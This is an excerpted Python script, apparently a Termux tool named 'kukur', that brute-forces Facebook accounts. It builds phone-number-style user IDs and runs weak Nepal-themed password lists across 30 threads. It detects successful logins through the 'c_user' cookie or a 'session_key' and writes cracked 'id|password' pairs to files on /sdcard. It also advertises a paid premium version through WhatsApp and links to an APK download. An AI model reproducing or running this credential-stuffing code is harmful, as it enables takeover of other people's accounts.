#SOURCE BY : ROSHAN_THAPA

from os import path

import os,base64,zlib,pip,urllib

os.system('xdg-open https://www.facebook.com/profile.php?id=100054457411370&mibextid=ZbWKwL/')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/kukur_VPN1.0.apk/file');menu()

                        elif xd in ['8','08']:

                                os.system('xdg-open https://www.facebook.com/profile.php?id=100054457411370&mibextid=ZbWKwL/?app=fbl');menu()
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+9779862755453&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi kukur Sir, I Need To Buy Your Paid kukur PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python kukur.py')
...
def pak():
                ...
                print('\033[1;31m Code example: 9818,9862,9826,9829')
                ...
                with tred(max_workers=30) as kukur:     
                        ...
                        for psx in user:
                                ...
                                passlist = [psx,ids,'Nepal','nepal1122','nepal12345','nepal1234','nepal12','nepal786','nepal123','nepal123456','nepalnepal123','786786']

                                kukur.submit(rndm,ids,passlist)
...
def gmail():
                ...
                print('\033[1;37m example: Roshan, Bikash, Iren, Kishor\033[1;97m')
                ...
                print('\033[1;37m example: Thapa, Magar, Xettri, Magar\033[1;97m')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [kukur-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        kukur=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in kukur:
                                ...
                                print('\r\r\033[1;32m [kukur-OK] %s | %s'%(ids,pas))

                                open('/sdcard/kukur-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in kukur:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [kukur-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/kukur-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [kukur-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/kukur-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [kukur-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/kukur-OK.txt','a').write(uid+'|'+pas+'\n')
